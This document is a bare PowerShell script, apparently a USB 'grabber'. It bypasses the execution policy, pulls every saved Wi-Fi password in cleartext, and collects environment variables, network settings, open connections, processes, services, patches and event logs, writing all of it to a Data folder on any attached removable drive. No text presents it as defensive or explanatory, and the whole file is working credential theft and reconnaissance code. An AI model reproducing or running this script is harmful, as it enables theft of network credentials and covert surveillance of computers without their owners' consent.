try {
    Write-Host "Bypassing Execution Policy..."
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force # Allows the script to run bypassing the default execution policies.
    Start-Sleep -Seconds 3
    Write-Host "Bypassed!"
} catch {
    Write-Host "Error: Unable to Bypass Execution Policy. Proceeding without Bypass."
}

$usbDriveLetter = Get-WmiObject -Query "SELECT * FROM Win32_DiskDrive WHERE MediaType='Removable Media'" | ForEach-Object {
    Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($_.DeviceID)'} WHERE AssocClass=Win32_DiskDriveToDiskPartition" | ForEach-Object {
        Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='$($_.DeviceID)'} WHERE AssocClass=Win32_LogicalDiskToPartition" | ForEach-Object {
            $_.DeviceID
        }
    }
}

if ($null -ne $usbDriveLetter) {
    $usbDriveLetter = $usbDriveLetter -join ","
    $usbDriveLetter = $usbDriveLetter -split ","
    foreach ($driveLetter in $usbDriveLetter) {
        $dataFolderPath = Join-Path -Path $driveLetter -ChildPath "Data"
        if (!(Test-Path -Path $dataFolderPath -PathType Container)) {
            New-Item -Path $dataFolderPath -ItemType Directory
        }

        $dataFolder = Join-Path -Path $driveLetter -ChildPath "Data"
        $wifiPasswordsPath = Join-Path -Path $dataFolder -ChildPath "WifiPasswords.txt"

        try {
            Write-Host "`nGetting Wi-Fi Passwords..."
            $wifiProfiles = netsh wlan show profiles
            $wifiPasswords = @()

            foreach ($profile in $wifiProfiles) {
                if ($profile -match 'All User Profile\s+:\s+(.+)') {
                    $profileName = $matches[1]
                    $keyContent = (netsh wlan show profile name="$profileName" key=clear) | Select-String 'Key Content'

                    if ($keyContent) {
                        $password = $keyContent.ToString() -replace '.+:\s*', ''
                        $wifiPasswords += "Profile: $profileName`nKey Content: $password`n"
                    }
                }
            }

            $wifiPasswords | Out-File -Append -FilePath $wifiPasswordsPath
            Write-Host "Wi-Fi Passwords collected and saved to $wifiPasswordsPath.`n"
        } catch {
            Write-Host "No Wi-Fi interface found. Skipping Wi-Fi-related commands."
        }

        Write-Host "Getting Computer Info..."
        Get-ComputerInfo | Out-File -Append -FilePath $dataFolder\ComputerInfo.txt
        Write-Host "Computer Info collected and saved to $dataFolder\ComputerInfo.txt.`n"

        Write-Host "Getting TcpipParameters..."
        Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters' | Out-File -Append -FilePath $dataFolder\TcpipParameters.txt
        Write-Host "TcpipParameters collected and saved to $dataFolder\TcpipParameters.txt.`n"

        Write-Host "Getting Operating System Info..."
        Get-CimInstance -ClassName Win32_OperatingSystem | Out-File -Append -FilePath $dataFolder\OperatingSystem.txt
        Write-Host "Operating System Info collected and saved to $dataFolder\OperatingSystem.txt.`n"

        Write-Host "Getting BIOS Info..."
        Get-WmiObject -Class Win32_BIOS | Out-File -Append -FilePath $dataFolder\BIOS.txt
        Write-Host "BIOS Info collected and saved to $dataFolder\BIOS.txt.`n"

        Write-Host "Getting Environment Variables..."
        Get-ChildItem Env: | Out-File -Append -FilePath $dataFolder\EnvironmentVariables.txt
        Write-Host "Environment Variables collected and saved to $dataFolder\EnvironmentVariables.txt.`n"

        Write-Host "Getting Network Interfaces..."
        [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | Out-File -Append -FilePath $dataFolder\NetworkInterfaces.txt
        Write-Host "Network Interfaces collected and saved to $dataFolder\NetworkInterfaces.txt.`n"

        Write-Host "Getting Network Adapters..."
        Get-WmiObject Win32_NetworkAdapter | Out-File -Append -FilePath $dataFolder\NetworkAdapter.txt
        Write-Host "Network Adapters collected and saved to $dataFolder\NetworkAdapter.txt.`n"

        Write-Host "Getting Net Adapters..."
        Get-NetAdapter | Out-File -Append -FilePath $dataFolder\NetAdapter.txt
        Write-Host "Net Adapters collected and saved to $dataFolder\NetAdapter.txt.`n"

        Write-Host "Getting Net IP Addresses..."
        Get-NetIPAddress | Out-File -Append -FilePath $dataFolder\NetIPAddress.txt
        Write-Host "Net IP Addresses collected and saved to $dataFolder\NetIPAddress.txt.`n"

        Write-Host "Getting Volumes..."
        Get-Volume | Out-File -Append -FilePath $dataFolder\Volume.txt
        Write-Host "Volumes collected and saved to $dataFolder\Volume.txt.`n"

        Write-Host "Getting Net IP Configurations..."
        Get-NetIPConfiguration | Out-File -Append -FilePath $dataFolder\NetIPConfiguration.txt
        Write-Host "Net IP Configurations collected and saved to $dataFolder\NetIPConfiguration.txt.`n"

        Write-Host "Getting Net Routes..."
        Get-NetRoute | Out-File -Append -FilePath $dataFolder\NetRoute.txt
        Write-Host "Net Routes collected and saved to $dataFolder\NetRoute.txt.`n"

        Write-Host "Getting Dns Client Server Addresses..."
        Get-DnsClientServerAddress | Out-File -Append -FilePath $dataFolder\DnsClientServerAddress.txt
        Write-Host "Dns Client Server Addresses collected and saved to $dataFolder\DnsClientServerAddress.txt.`n"

        Write-Host "Getting Net TCP Connections..."
        Get-NetTCPConnection | Out-File -Append -FilePath $dataFolder\NetTCPConnection.txt
        Write-Host "Net TCP Connections collected and saved to $dataFolder\NetTCPConnection.txt.`n"

        Write-Host "Getting Net UDP Endpoints..."
        Get-NetUDPEndpoint | Out-File -Append -FilePath $dataFolder\NetUDPEndpoint.txt
        Write-Host "Net UDP Endpoints collected and saved to $dataFolder\NetUDPEndpoint.txt.`n"

        Write-Host "Getting Processes..."
        Get-Process | Out-File -Append -FilePath $dataFolder\Processes.txt
        Write-Host "Processes collected and saved to $dataFolder\Processes.txt.`n"

        Write-Host "Getting Services..."
        Get-Service | Out-File -Append -FilePath $dataFolder\Services.txt
        Write-Host "Services collected and saved to $dataFolder\Services.txt.`n"

        Write-Host "Getting HotFixes..."
        Get-HotFix | Out-File -Append -FilePath $dataFolder\HotFixes.txt
        Write-Host "HotFixes collected and saved to $dataFolder\HotFixes.txt.`n"

        Write-Host "Getting System Event Logs..."
        Get-EventLog -LogName System | Out-File -Append -FilePath $dataFolder\EventLog_System.txt
        Write-Host "System Event Logs collected and saved to $dataFolder\EventLog_System.txt."
    }
}